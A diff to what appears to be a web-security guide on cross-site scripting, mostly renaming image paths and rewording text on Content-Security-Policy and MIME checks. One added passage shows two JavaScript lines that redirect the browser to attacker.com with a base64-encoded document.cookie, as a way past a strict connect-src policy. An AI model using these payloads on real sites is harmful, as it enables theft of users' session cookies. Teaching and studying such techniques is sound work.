@@ -542,7 +542,7 @@ document.body.innerHTML = `
 ```
 {% endcode %}
 
-![](<../.gitbook/assets/image (6).png>)
+![](<../.gitbook/assets/image (6) (1).png>)
 
 Since you are executing code on the same origin, you can even **open windows** to the same domain, and control their HTML content. With this, you could create a popup window showing the real domain in the address bar, with some login form or other data.&#x20;
 
@@ -616,7 +616,7 @@ alert()
 
 For more complex scenarios where you cannot directly upload `.js` files, the `Content-Type:` header comes into play. The browser decides based on this header if the requested file is likely to be a real script, and if the type is `image/png` for example, it will simply refuse to execute it:
 
-<figure><img src="../.gitbook/assets/image (3).png" alt="Refused to execute script from &#x27;http://localhost/uploads/image.png&#x27; because its MIME type (&#x27;image/png&#x27;) is not executable."><figcaption><p>Browser refusing to execute <code>image/png</code> file as JavaScript source</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (5).png" alt="Refused to execute script from &#x27;http://localhost/uploads/image.png&#x27; because its MIME type (&#x27;image/png&#x27;) is not executable."><figcaption><p>Browser refusing to execute <code>image/png</code> file as JavaScript source</p></figcaption></figure>
 
 Some more ambiguous types are allowed, however, like `text/plain`, `text/html` or **no type at all**. These are especially useful as commonly a framework will decide what `Content-Type` to add based on the file extension, which may be empty in some cases causing it to choose a type allowed for JavaScript execution. This ambiguity is prevented however with an extra \
 `X-Content-Type-Options: nosniff` header that is sometimes set, making the detection from the browser a lot more strict and only allowing real `application/javascript` files ([full list](https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third\_party/blink/common/mime\_util/mime\_util.cc#50)).&#x20;
@@ -627,11 +627,17 @@ Another idea instead of _storing_ data, is **reflecting** data. If there is any 
 
 #### Exfiltrating with strict [`connect-src`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/connect-src)
 
-* [ ] even use regular functionality to exfiltrate data, like uploading a file / posting data an attacker can find
-
-This directive defines which hosts can be **connected to**, meaning if your attacker's server is not on the list, you cannot make a simple `fetch()` request to your server in order to exfiltrate any data. While there is no direct bypass for this, you may be able to still connect to any origin **allowed** to exfiltrate data by **storing** it, and later retrieving it as the attacker at a place you can find. By [#forcing-requests-fetch](cross-site-scripting-xss.md#forcing-requests-fetch "mention"), you could, for example, make a POST request that changes a profile picture, or some other public data, while embedding the data you want to exfiltrate. This way the policy is not broken, but the attacker can still find the data on the website itself.&#x20;
+This directive defines which hosts can be **connected to**, meaning if your attacker's server is not on the list, you cannot make a `fetch()` request like normal to your server in order to exfiltrate any data. While there is no direct bypass for this, you may be able to still connect to any origin **allowed** to exfiltrate data by _storing_ it, and _later retrieving_ it as the attacker at a place you can find. By [#forcing-requests-fetch](cross-site-scripting-xss.md#forcing-requests-fetch "mention"), you could, for example, make a POST request that changes a profile picture, or some other public data, while embedding the data you want to exfiltrate. This way the policy is not broken, but the attacker can still find the data on the website itself.&#x20;
 
 With this technique, remember that even _one bit_ of information is enough, as you can often _repeat_ it to reveal a larger amount of information.&#x20;
+
+A more general bypass for this to _redirect_ the user fully using JavaScript, as browser do not prevent this. Then in the URL, you put the data you want to exfiltrate to receive it in a request:
+
+<pre class="language-javascript" data-overflow="wrap"><code class="lang-javascript">// Redirect via document.location:
+<strong>location = `http://attacker.com/leak?${btoa(document.cookie)}`
+</strong>// Redirect via &#x3C;meta> tag (only at start of page loadd):
+<strong>document.write(`&#x3C;meta http-equiv="refresh" content="0; url=http://attacker.com/leak?${btoa(document.cookie)}">`)
+</strong></code></pre>
 
 #### CDNs in `script-src` (Angular Bypass)
 
@@ -661,7 +667,7 @@ Some of the most useful and common filter bypasses are shown in [#common-filter-
 
 If a server is checking your input for suspicious strings, they will have a hard time as there are many ways to obfuscate your payloads. Even a simple `<a href=...>` tag has many places where the browser allows special and unexpected characters, which may break the pattern the server is trying to search for. Here is a clear diagram showing _where_ you can insert _what_ characters:
 
-<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption><p>XSS mutation points with possible special characters (<a href="https://twitter.com/hackerscrolls/status/1273254212546281473?s=21">source</a>)</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption><p>XSS mutation points with possible special characters (<a href="https://twitter.com/hackerscrolls/status/1273254212546281473?s=21">source</a>)</p></figcaption></figure>
 
 The XSS Cheat Sheet by PortSwigger has an extremely comprehensive list of all possible tags, attributes, and browsers that allow JavaScript execution, with varying levels of user interaction:
 
